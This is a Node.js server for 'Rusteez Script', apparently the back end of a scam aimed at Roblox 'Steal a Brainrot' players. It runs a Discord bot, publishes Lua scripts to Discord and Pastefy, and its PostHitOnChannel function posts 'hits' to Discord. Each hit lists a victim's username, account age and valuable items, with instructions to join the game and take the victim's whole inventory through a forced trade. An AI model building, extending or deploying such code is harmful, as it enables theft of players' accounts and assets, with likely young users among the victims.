const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
const app = express();
app.use(express.json());
const server = http.createServer(app);
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const pastefy = new PastefyClient(process.env.PASTEFY_KEY);

// --- BOT DISCORD ---
const clientDiscord = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// 3. Route de vérification (si tu ne l'avais pas encore)
app.get('/api/admin/verify', (req, res) => {
    res.json({ success: req.query.token === ADMIN_TOKEN });
});

app.post('/api/admin/post-update', async (req, res) => {
    const token = req.query.token || req.body.token;
    
    // 1. Vérification de sécurité (comme sur tes autres routes admin)
    if (token !== ADMIN_TOKEN) {
        return res.status(403).json({ error: "Access Denied" });
    }

    const { title, content } = req.body;
    const UPDATE_CHANNEL_ID = "1493053319894138982"; // Ton salon spécifié

    // Validation des champs
    if (!title || !content) {
        return res.status(400).json({ error: "Title and Content are required" });
    }

    try {
        // 2. Récupération du salon via le client Discord déjà initialisé
        const channel = await clientDiscord.channels.fetch(UPDATE_CHANNEL_ID);
        
        if (!channel) {
            log(`❌ [UPDATE] Channel ${UPDATE_CHANNEL_ID} not found`);
            return res.status(404).json({ error: "Discord channel not found" });
        }

        // 3. Création de l'Embed (Style Rusteez)
        const updateEmbed = new EmbedBuilder()
            .setTitle(`🚀 NEW UPDATE : ${title}`)
            .setColor(0x6366f1) // Couleur Indigo (assortie à ton nouveau UI)
            .setDescription(`\`\`\`text\n${content}\n\`\`\``)
            .setTimestamp()
            .setFooter({ text: "Rusteez Script • System Update", iconURL: clientDiscord.user.displayAvatarURL() });

        // 4. Envoi du message (avec mention @everyone si tu le souhaites)
        await channel.send({ 
            content: "🔔 **@everyone**", 
            embeds: [updateEmbed] 
        });

        log(`📢 [UPDATE] Published: ${title}`);
        res.json({ success: true, message: "Update posted successfully" });

    } catch (error) {
        log(`❌ [UPDATE ERROR] ${error.message}`);
        res.status(500).json({ error: "Failed to send discord message" });
    }
});
app.post('/api/admin/post-script', async (req, res) => {
    const token = req.query.token || req.body.token;
    
    // 1. Vérification de sécurité (ADMIN_TOKEN doit être défini dans votre environnement)
    if (token !== ADMIN_TOKEN) {
        return res.status(403).json({ error: "Access Denied" });
    }

    // Récupération des nouveaux champs fournis par le dashboard
    const { title, image, description, lua } = req.body;
    const SCRIPT_CHANNEL_ID = "1493053716562182255"; // ID de votre salon Discord

    // Validation des champs obligatoires (Titre et Code LUA)
    if (!title || !lua) {
        return res.status(400).json({ error: "Title and LUA Code are required" });
    }

    try {
        // 2. Récupération du salon Discord
        const channel = await clientDiscord.channels.fetch(SCRIPT_CHANNEL_ID);
        
        if (!channel) {
            log(`❌ [SCRIPT] Channel ${SCRIPT_CHANNEL_ID} not found`);
            return res.status(404).json({ error: "Discord channel not found" });
        }

        // 3. Création de l'Embed "Visual Script" (Style Rusteez)
        const scriptEmbed = new EmbedBuilder()
            .setTitle(`📜 NEW SCRIPT : ${title}`)
            .setColor(0xa855f7) // Couleur Violette (assortie à la section Script)
            .setTimestamp()
            .setFooter({ 
                text: "Rusteez Master • Script Publisher", 
                iconURL: clientDiscord.user.displayAvatarURL() 
            });

        // Ajout de la description si fournie
        if (description) {
            scriptEmbed.addFields({ name: "📝 Description", value: description });
        }

        // Ajout du code LUA dans un bloc de code syntaxé
        scriptEmbed.addFields({ 
            name: "💻 LUA Code", 
            value: `\`\`\`lua\n${lua}\n\`\`\`` 
        });

        // Ajout de l'image de preview si l'URL est valide
        if (image && image.startsWith('http')) {
            scriptEmbed.setImage(image);
        }

        // 4. Envoi du message sur Discord
        await channel.send({ 
            content: lua, 
            embeds: [scriptEmbed] 
        });

        log(`📢 [SCRIPT] Published: ${title}`);
        res.json({ success: true, message: "Script posted successfully to Discord" });

    } catch (error) {
        log(`❌ [SCRIPT ERROR] ${error.message}`);
        res.status(500).json({ error: "Failed to send discord message" });
    }
});

async function uploadToPastefy(code, webhookId) {
    try {
        log("☁️ [PASTEFY] Creating paste via Official SDK...");

        // Utilisation simplifiée du SDK
        const paste = await pastefy.createPaste({
            title: `SABTrade`,
            content: code,
            visibility: 'PUBLIC' // Utilise 'UNLISTED' ou 'PUBLIC' selon tes besoins
        });

        if (paste && paste.id) {
            const rawUrl = `https://pastefy.app/${paste.id}/raw`;
            log(`✅ [PASTEFY] Success! ID: ${paste.id}`);
            return rawUrl;
        }
        
        return null;
    } catch (error) {
        log(`❌ [PASTEFY ERROR] ${error.message}`);
        return null;
    }
}
async function PostHitOnChannel(channelId, hitInfo) {
    try {
        const ForwardChannel = await clientDiscord.channels.fetch(channelId).catch(() => null);
                    if (ForwardChannel) {
                        const hitEmbed = new EmbedBuilder()
                    .setTitle("Rusteez Hit")
                    .setColor(0x2b2d31)
                    .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
                    .addFields(
                        { 
                            name: "📄 Player Information", 
                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                        },
                        {
                            name: "🧠 Brainrots",
                            value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                                ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
                                    // 1. Préparation des éléments (Mutation + Traits)
                                    let extras = [];
                                    
                                    // On ajoute la mutation en premier si elle existe
                                    if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
                                        extras.push(br.Mutation);
                                    }
                                    
                                    // On ajoute les traits (qu'ils soient déjà une string ou un array)
                                    if (br.Traits) {
                                        if (Array.isArray(br.Traits)) {
                                            br.Traits.forEach(t => { if(t && t !== "") extras.push(t); });
                                        } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
                                            extras.push(br.Traits);
                                        }
                                    }
                        
                                    // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
                                    const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
                        
                                    // 3. Retour de la ligne formatée
                                    return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                                }).join('\n')
                                : "None"}\n\`\`\``
                        }
                    )
                    .setFooter({ text: `Rusteez Script` })
                    .setTimestamp();
        ForwardChannel.send({ embeds: [hitEmbed] });
                    }
    } catch (err) {
        log(`⚠️ Forward Channel Error: ${err.message}`);
    }
}

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
